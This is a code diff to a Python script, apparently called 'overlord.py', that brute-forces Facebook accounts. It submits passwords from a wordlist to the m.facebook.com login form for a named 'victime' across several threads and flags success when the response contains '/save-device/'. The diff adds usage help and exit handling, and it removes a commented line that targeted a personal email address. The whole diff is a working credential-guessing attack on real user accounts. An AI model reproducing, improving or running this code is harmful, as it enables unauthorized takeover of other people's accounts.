@@ -4,7 +4,6 @@ from browser import Browser
 import argparse
 from colorama import *
 import threading
-
 ascii_p = """
 
                                                                                                                                      dddddddd
@@ -27,11 +26,12 @@ o:::::::::::::::o       v:::::v       e::::::::eeeeeeee   r:::::r           l:::
 """
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-u', metavar="user_id", type=str, nargs="?")
-parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
+parser.add_argument('-u', metavar="user_id", type=str, nargs="?", help="facebook username of victime, can be email or phone number")
+parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?", help="wordlist is password dictionary, document text of word list")
 args = parser.parse_args()
 
 url = "https://m.facebook.com"
+run = True
 
 def login_bruteforce(username, wordlist):
     browser = Browser()
@@ -40,14 +40,16 @@ def login_bruteforce(username, wordlist):
             password = password.strip("\n")
             browser.open(url)
             response = browser.submit_form(form={'email': username, 'pass': password})
-            verificatiion = "/save-device/" in response
-            print(Fore.RED + "{0} => {1}: {2}".format(password, verificatiion, response) + Fore.WHITE)
-            if verificatiion:
-                print(Fore.GREEN + "{0} => {1}".format(password, verificatiion) + Fore.WHITE)
-                exit()
+            verification = "/save-device/" in response # bool
+            print(Fore.RED + "{0} => {1}: {2}".format(password, verification, response) + Fore.WHITE)
+            if verification and run:
+                print(Fore.GREEN + "{0} => {1}".format(password, verification) + Fore.WHITE)
+                run = False
+                os.sys.exit()
         except KeyboardInterrupt:
             print("Exit Programme !")
-            exit()
+            run = False
+            os.sys.exit()
 
 
 def dived(wordlist):
@@ -120,7 +122,9 @@ def start_multi_thread(username, wordlist):
     [th.start() for th in n_thread]
 
 if __name__ == "__main__":
-    start_multi_thread(args.u, args.p)
+    if args.u and args.p:
+        start_multi_thread(args.u, args.p)
+    else:
+        print(Fore.RED + "./overlord.py -h or ./overlord --help for more help\n" + './overlord.py -u [email/phoneNumber] -p [wordlist.txt]' + Fore.WHITE)
     # forgot_password_bruteforce(args.u, args.p)
-    # forgot_password_bruteforce("24nomeniavo@gmail.com", 'test')
 
